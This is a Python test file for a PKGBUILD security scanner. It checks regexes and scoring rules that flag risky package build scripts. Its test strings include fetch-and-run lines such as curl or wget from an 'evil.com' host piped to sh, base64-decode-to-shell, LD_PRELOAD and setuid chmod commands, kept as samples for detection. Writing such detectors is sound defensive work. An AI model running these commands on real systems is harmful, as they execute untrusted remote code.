from __future__ import annotations

import re

import pytest

from pkginspect.rules import load_rules
from pkginspect.scoring import (
    BASH_C_RE,
    CURL_RE,
    EVAL_RE,
    LD_PRELOAD_RE,
    OBFUSCATION_RE,
    PACMAN_WRITE_RE,
    PIPE_SHELL_RE,
    SETCAP_RE,
    SUDO_RE,
    WRITE_CMD_RE,
    extract_array,
    extract_package_bodies,
    score_pkgbuild,
)


# ── regex unit tests ─────────────────────────────────────────────


class TestPipeShellRe:
    def test_curl_pipe_sh(self):
        assert PIPE_SHELL_RE.search("curl https://evil.com | sh")

    def test_curl_pipe_bash(self):
        assert PIPE_SHELL_RE.search("curl https://evil.com | bash")

    def test_wget_pipe_sh(self):
        assert PIPE_SHELL_RE.search("wget -qO- https://evil.com | sh")

    def test_source_process_substitution(self):
        assert PIPE_SHELL_RE.search("source <(curl https://evil.com)")

    def test_no_match_curl_alone(self):
        assert not PIPE_SHELL_RE.search("curl https://example.com -o file.tar.gz")

    def test_no_match_wget_save(self):
        assert not PIPE_SHELL_RE.search("wget https://example.com/file.tar.gz")


class TestEvalRe:
    def test_eval(self):
        assert EVAL_RE.search("eval $VAR")

    def test_exec(self):
        assert EVAL_RE.search("exec /usr/bin/app")

    def test_no_match_evaldir(self):
        # 'evaldir' is not 'eval '
        assert not EVAL_RE.search("evaldir=/tmp/build")


class TestBashCRe:
    def test_bash_c(self):
        assert BASH_C_RE.search('bash -c "echo evil"')

    def test_sh_c(self):
        assert BASH_C_RE.search("sh -c 'malicious'")

    def test_no_match_bash_alone(self):
        assert not BASH_C_RE.search("bash script.sh")


class TestObfuscationRe:
    def test_base64_d(self):
        assert OBFUSCATION_RE.search("base64 -d encoded.txt | sh")

    def test_base64_decode(self):
        assert OBFUSCATION_RE.search("base64 --decode payload.b64")

    def test_xxd_r(self):
        assert OBFUSCATION_RE.search("xxd -r hex.txt > binary")

    def test_no_match_base64_encode(self):
        assert not OBFUSCATION_RE.search("base64 file.bin > encoded.txt")


class TestLdPreloadRe:
    def test_ld_preload(self):
        assert LD_PRELOAD_RE.search("LD_PRELOAD=/usr/lib/evil.so make")

    def test_ld_library_path(self):
        assert LD_PRELOAD_RE.search("LD_LIBRARY_PATH=/tmp/libs ./app")

    def test_no_match_regular_make(self):
        assert not LD_PRELOAD_RE.search("make CFLAGS='-O2'")


class TestSetcapRe:
    def test_setcap(self):
        assert SETCAP_RE.search("setcap cap_net_raw+ep /usr/bin/ping")

    def test_chmod_777(self):
        assert SETCAP_RE.search("chmod 777 /usr/bin/app")

    def test_chmod_setuid(self):
        assert SETCAP_RE.search("chmod 4755 /usr/bin/app")

    def test_chmod_u_plus_s(self):
        assert SETCAP_RE.search("chmod u+s /usr/bin/app")

    def test_no_match_chmod_755(self):
        assert not SETCAP_RE.search("chmod 755 /usr/bin/app")


class TestWriteCmdRe:
    def test_install_to_etc(self):
        assert WRITE_CMD_RE.search("install -Dm644 foo.conf /etc/foo/bar.conf")

    def test_cp_to_usr(self):
        assert WRITE_CMD_RE.search("cp mybin /usr/bin/mybin")

    def test_sed_to_etc(self):
        assert WRITE_CMD_RE.search("sed -i 's/old/new/' /etc/app/config")

    def test_no_match_install_to_pkgdir(self):
        assert not WRITE_CMD_RE.search('install -Dm755 app "$pkgdir/usr/bin/app"')


class TestCheckRe:
    def test_plain_sha256(self):
        from pkginspect.scoring import CHECK_RE

        assert CHECK_RE.match("sha256sums=")

    def test_per_arch_sha256(self):
        from pkginspect.scoring import CHECK_RE

        assert CHECK_RE.match("sha256sums_x86_64=")

    def test_per_arch_aarch64(self):
        from pkginspect.scoring import CHECK_RE

        assert CHECK_RE.match("sha256sums_aarch64=")

    def test_per_arch_b2(self):
        from pkginspect.scoring import CHECK_RE

        assert CHECK_RE.match("b2sums_armv7h=")


def test_per_arch_checksums_not_flagged(config):
    """Packages using sha256sums_x86_64= etc. should not get 'No checksum array'."""
    lines = [
        "# Maintainer: Test <test@test.com>",
        "pkgname=nordvpn-bin",
        "pkgver=1.0",
        "pkgrel=1",
        "arch=(x86_64 aarch64)",
        "license=(GPL3)",
        "source_x86_64=('https://example.com/pkg_amd64.deb')",
        "source_aarch64=('https://example.com/pkg_arm64.deb')",
        "sha256sums_x86_64=('abc123')",
        "sha256sums_aarch64=('def456')",
        'package() { bsdtar -C "$pkgdir" -xf *.deb; }',
    ]
    result = score_pkgbuild(lines, config=config)
    messages = [f.message for f in result.findings]
    assert not any("No checksum array" in m for m in messages)


class TestExtractArray:
    def test_simple_source(self):
        txt = 'source=("https://example.com/foo.tar.gz")'
        result = extract_array("source", txt)
        assert "https://example.com/foo.tar.gz" in result

    def test_multiline_source(self):
        txt = 'source=(\n  "https://a.com/a.tar.gz"\n  "https://b.com/b.tar.gz"\n)'
        result = extract_array("source", txt)
        assert "a.tar.gz" in result
        assert "b.tar.gz" in result

    def test_missing_array(self):
        result = extract_array("source", "pkgname=foo\npkgver=1.0")
        assert result == ""


class TestExtractPackageBodies:
    def test_single_package(self):
        txt = 'package() {\n  install -Dm755 app "$pkgdir/usr/bin/app"\n}\n'
        bodies = extract_package_bodies(txt)
        assert len(bodies) == 1
        assert "install" in bodies[0]

    def test_split_packages(self):
        txt = (
            'package_foo() {\n  install foo "$pkgdir/foo"\n}\n'
            'package_bar() {\n  install bar "$pkgdir/bar"\n}\n'
        )
        bodies = extract_package_bodies(txt)
        assert len(bodies) == 2

    def test_nested_braces(self):
        txt = 'package() {\n  if [ -f file ]; then\n    { install file "$pkgdir/file"; }\n  fi\n}\n'
        bodies = extract_package_bodies(txt)
        assert len(bodies) == 1
        assert "install" in bodies[0]


# ── scoring integration tests ────────────────────────────────────


@pytest.fixture
def config():
    return load_rules()


def test_clean_scores_high(clean_lines, config):
    result = score_pkgbuild(clean_lines, config=config)
    assert result.score >= 95


def test_malicious_scores_zero(malicious_lines, config):
    result = score_pkgbuild(malicious_lines, config=config)
    assert result.score == 0


def test_malicious_detects_pipe_to_shell(malicious_lines, config):
    result = score_pkgbuild(malicious_lines, config=config)
    messages = [f.message for f in result.findings]
    assert any("Pipe to shell" in m for m in messages)


def test_malicious_detects_eval(malicious_lines, config):
    result = score_pkgbuild(malicious_lines, config=config)
    messages = [f.message for f in result.findings]
    assert any("eval" in m for m in messages)


def test_malicious_detects_obfuscation(malicious_lines, config):
    result = score_pkgbuild(malicious_lines, config=config)
    messages = [f.message for f in result.findings]
    assert any("Base64" in m for m in messages)


def test_moderate_score_range(moderate_lines, config):
    result = score_pkgbuild(moderate_lines, config=config)
    assert 40 <= result.score <= 85


def test_moderate_detects_insecure_url(moderate_lines, config):
    result = score_pkgbuild(moderate_lines, config=config)
    messages = [f.message for f in result.findings]
    assert any("Insecure URL" in m for m in messages)


def test_moderate_detects_skip(moderate_lines, config):
    result = score_pkgbuild(moderate_lines, config=config)
    messages = [f.message for f in result.findings]
    assert any("SKIP" in m for m in messages)


def test_comment_stripping_no_false_positive(config):
    """Commented-out suspicious code should not trigger penalties."""
    lines = [
        "# Maintainer: Test <test@test.com>",
        "pkgname=foo",
        "pkgver=1.0",
        "pkgrel=1",
        "arch=(x86_64)",
        "license=(MIT)",
        "source=('https://example.com/foo.tar.gz')",
        "sha512sums=('abc123' * 128)",
        "# curl https://evil.com | bash",
        "# eval $PAYLOAD",
        "build() { make; }",
        'package() { make DESTDIR="$pkgdir" install; }',
    ]
    result = score_pkgbuild(lines, config=config)
    messages = [f.message for f in result.findings]
    assert not any("Pipe to shell" in m for m in messages)
    assert not any("eval" in m for m in messages)


def test_git_unpinned_only_in_source(config):
    """git+https in a comment should not trigger unpinned warning."""
    lines = [
        "# Maintainer: Test <test@test.com>",
        "# See also: git+https://github.com/example/repo",
        "pkgname=foo",
        "pkgver=1.0",
        "pkgrel=1",
        "arch=(x86_64)",
        "license=(MIT)",
        "source=('https://example.com/foo.tar.gz')",
        "sha512sums=('abc')",
        "build() { make; }",
        'package() { make DESTDIR="$pkgdir" install; }',
    ]
    result = score_pkgbuild(lines, config=config)
    messages = [f.message for f in result.findings]
    assert not any("unpinned" in m.lower() for m in messages)


def test_aur_meta_out_of_date(config):
    import time

    lines = [
        "# Maintainer: Test <test@test.com>",
        "pkgname=foo",
        "pkgver=1.0",
        "pkgrel=1",
        "arch=(x86_64)",
        "license=(MIT)",
        "source=('https://example.com/foo.tar.gz')",
        "sha512sums=('abc')",
        "build() { make; }",
        'package() { make DESTDIR="$pkgdir" install; }',
    ]
    meta = {
        "NumVotes": 100,
        "Maintainer": "someone",
        "OutOfDate": int(time.time()) - 86400 * 10,
    }
    result = score_pkgbuild(lines, config=config, aur_meta=meta)
    messages = [f.message for f in result.findings]
    assert any("out of date" in m.lower() for m in messages)


class TestPacmanWriteRe:
    def test_pacman_install(self):
        assert PACMAN_WRITE_RE.search("pacman -S extra/package")

    def test_pacman_remove(self):
        assert PACMAN_WRITE_RE.search("pacman -R some-package")

    def test_pacman_upgrade(self):
        assert PACMAN_WRITE_RE.search("pacman -U /tmp/package.pkg.tar.zst")

    def test_no_match_pacman_query(self):
        # -Q is read-only
        assert not PACMAN_WRITE_RE.search("pacman -Q package")

    def test_no_match_pacman_deptest(self):
        # -T is the deptest flag used legitimately in PKGBUILDs (e.g., paru)
        assert not PACMAN_WRITE_RE.search("pacman -T pacman-git > /dev/null")

    def test_no_match_depends_field(self):
        # 'pacman' as a dependency name should not match
        assert not PACMAN_WRITE_RE.search("depends=('git' 'pacman' 'libalpm.so>=14')")


def test_paru_like_pacman_query_not_flagged(config):
    """pacman -T (deptest) is a legitimate read-only check — must not trigger blocker."""
    lines = [
        "# Maintainer: Test <test@test.com>",
        "pkgname=paru",
        "pkgver=1.0",
        "pkgrel=1",
        "arch=(x86_64)",
        "license=(GPL3)",
        "depends=('git' 'pacman')",
        "source=('https://example.com/paru-1.0.tar.gz')",
        "sha256sums=('abc123')",
        "build() {",
        "  if pacman -T pacman-git > /dev/null; then",
        "    _features+=git,",
        "  fi",
        "  cargo build --release",
        "}",
        'package() { install -Dm755 target/release/paru "$pkgdir/usr/bin/paru"; }',
    ]
    result = score_pkgbuild(lines, config=config)
    assert result.score > 0, "pacman -T should not trigger the blocker"
    messages = [f.message for f in result.findings]
    assert not any("pacman" in m.lower() for m in messages)
